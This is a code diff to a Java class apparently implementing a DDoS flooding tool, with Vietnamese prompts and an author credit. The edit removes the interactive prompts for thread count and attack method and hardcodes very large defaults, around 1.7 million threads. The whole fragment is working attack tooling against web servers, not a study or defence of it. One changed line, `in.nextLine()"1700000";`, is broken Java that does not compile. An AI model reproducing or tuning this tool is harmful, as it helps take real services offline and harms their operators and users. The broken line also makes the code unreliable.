@@ -66,10 +66,10 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Cài đặt cấu hình DDoS By: Châu Nguyễn");
+        System.out.println("Đang cài đặt cấu hình DDoS By: Châu Nguyễn");
 
-        System.out.print("Luồng (điền mặc định 1700000): ");
-        String amount = in.nextLine();
+        //System.out.print("Luồng (điền mặc định 1700000): ");
+        String amount = in.nextLine()"1700000";
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
             Dos.amount = 2000;
@@ -77,8 +77,8 @@ public class Dos implements Runnable {
             Dos.amount = Integer.parseInt(amount);
         }
 
-        System.out.print("Phương thức (điền mặc định 84000000): ");
-        String option = in.nextLine();
+        //System.out.print("Phương thức (điền mặc định 84000000): ");
+        String option = "84000000";
         int ioption = 1;
         if (option == "get" || option == "GET") {
             if (SUrl[0] == "http" || SUrl[0].equals("http")) {
